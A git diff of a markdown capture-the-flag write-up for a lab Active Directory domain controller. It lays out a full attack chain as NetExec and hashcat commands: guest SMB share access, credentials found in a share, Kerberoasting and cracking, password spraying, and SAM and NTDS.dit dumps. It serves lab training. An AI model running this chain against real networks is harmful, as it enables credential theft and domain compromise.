@@ -24,7 +24,8 @@ The client has provided you with VPN access to their internal network, but no cr
 
 ## Recon
 
-![Nmap Scan](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/nmap.png "NMAP")
+![Nmap Scan](/images/writeups/machines/hacksmarter/HSM_Martini/nmap.png "NMAP")
+
 Looks like a classic DC.
 
 With this, we can edit our hosts file and add DC01.dry.martini.bars as a known host.
@@ -33,74 +34,94 @@ With this, we can edit our hosts file and add DC01.dry.martini.bars as a known h
 
 Without credentials, we can start with enumerating the SMB service. If we have null or guest logins enabled, we might be able to get some insight into network shares or users present.
 
-`nxc smb 10.1.44.144 -u '' -p ''`
+```bash
+nxc smb 10.1.44.144 -u '' -p ''
+```
 
-![SMB Null Login](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/nxc-smb-null.png "SMB Null login")
+![SMB Null Login](/images/writeups/machines/hacksmarter/HSM_Martini/nxc-smb-null.png "SMB Null login")
 
 Null login was successful! Let's see if we can enumerate shares:
 
-`nxc smb 10.1.44.144 -u '' -p '' --shares`
+```bash
+nxc smb 10.1.44.144 -u '' -p '' --shares
+```
 
-![SMB Null Shares](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/nxc-smb-shares.png "SMB Null Shares")
+![SMB Null Shares](/images/writeups/machines/hacksmarter/HSM_Martini/nxc-smb-shares.png "SMB Null Shares")
 
 We do see some interesting shares, but unfortunately no access. 
 
 Let's try to do the same thing with a guest account:
 
-`nxc smb 10.1.44.144 -u 'a' -p '' --shares`
+```bash
+nxc smb 10.1.44.144 -u 'a' -p '' --shares
+```
 
 > if user 'a' exists, the DC will try to authenticate, otherwise it will be considered a guest account.
 
-![SMB Guest Shares](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/nxc-smb-guest.png "SMB Guest Shares")
+![SMB Guest Shares](/images/writeups/machines/hacksmarter/HSM_Martini/nxc-smb-guest.png "SMB Guest Shares")
 
 We have `READ,WRITE` permissions for the share `notes`. We can download all available shares by using NetExec's spider_plus module.
 
-`nxc smb 10.1.44.144 -u 'a' -p '' -M spider_plus -o DOWNLOAD_FLAG=True`
+```bash
+nxc smb 10.1.44.144 -u 'a' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
+```
 
 With that, we can simply enumerate the notes share and see what we find. Lucky for us, user `mprice` left their credentials in the notes.txt file.
 
-![Notes.txt Found](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/notes-share-creds-found.png "Notes.txt found")
+![Notes.txt Found](/images/writeups/machines/hacksmarter/HSM_Martini/notes-share-creds-found.png "Notes.txt found")
 
 ## LDAP Enumeration
 With valid credentials, we can now start enumerating LDAP and find other potential users as well.
 
-`nxc ldap dc01 -u 'mprice' -p <REDACTED> --users-export users.txt`
+```bash
+nxc ldap dc01 -u 'mprice' -p <REDACTED> --users-export users.txt
+```
 
-![Additional Users](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/nxc-ldap-valid-users.png "Additional Users via LDAP")
+![Additional Users](/images/writeups/machines/hacksmarter/HSM_Martini/nxc-ldap-valid-users.png "Additional Users via LDAP")
 
 ## Kerberoasting & Hashcat
 Since there's a service account in the mix, let's see if this is kerberoastable. 
 
-`nxc ldap dc01 -u 'mprice' -p <REDACTED> --kerberoasting kerberoast.txt`
+```bash
+nxc ldap dc01 -u 'mprice' -p <REDACTED> --kerberoasting kerberoast.txt
+```
 
-![Kerberoasting](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/nxc-kerberoast-athena_svc.png "Kerberoasting")
+![Kerberoasting](/images/writeups/machines/hacksmarter/HSM_Martini/nxc-kerberoast-athena_svc.png "Kerberoasting")
 
 We can now crack this with hashcat and hopefully we will get a password:
 
-`hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt`
+```bash
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+```
 
-![Haschat 1](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/hashcat-run.png "Hashcat 1")
+![Haschat 1](/images/writeups/machines/hacksmarter/HSM_Martini/hashcat-run.png "Hashcat 1")
 
-![Haschat 2](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/hashcat-cracked.png "Hashcat 2")
+![Haschat 2](/images/writeups/machines/hacksmarter/HSM_Martini/hashcat-cracked.png "Hashcat 2")
 
 Let's spray this new password across all users. Password re-use is a common issue:
 
-`nxc winrm dc01 -u users.txt -p <REDACTED> --continue-on-success`
+```bash
+nxc winrm dc01 -u users.txt -p <REDACTED> --continue-on-success
+```
 
-![Password Reuse](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/password-reuse-athenat0.png "Password Reuse")
+![Password Reuse](/images/writeups/machines/hacksmarter/HSM_Martini/password-reuse-athenat0.png "Password Reuse")
 
 ## Dumping Credentials
 We can continue to use NetExec to dump credentials from the host. Since we already have Admin access via the 2 users shown earlier, let's try to dump the SAM and NTDS.dit.
 
 > I tried to dump the SAM and NTDS using athena_svc but it looks like there were some potential controls that prevented the dump from the service account. No worries, though, we have the other user account to grab our loot.
 
-`nxc winrm dc01 -u 'athena.t0' -p <REDACTED> --sam`
+```bash
+nxc winrm dc01 -u 'athena.t0' -p <REDACTED> --sam
+```
 
-![Dumping SAM](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/nxc-dump-sam.png "Dumping SAM")
+![Dumping SAM](/images/writeups/machines/hacksmarter/HSM_Martini/nxc-dump-sam.png "Dumping SAM")
 
-`nxc winrm dc01 -u 'athena.t0' -p <REDACTED> --ntds`
+```bash
+nxc winrm dc01 -u 'athena.t0' -p <REDACTED> --ntds
+```
 
-![Dumping NTDS.dit](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/nxc-ntds-krbtgt.png "Dumping NTDS.dit")
+![Dumping NTDS.dit](/images/writeups/machines/hacksmarter/HSM_Martini/nxc-ntds-krbtgt.png "Dumping NTDS.dit")
 
 ## Conclusion
 This was a nice box that goes to show how small misconfigurations can eventually lead to big problems. Allowing guest logins to access the network share may be justified by the business, but sensitive files with credentials should not be accessible to guests. 
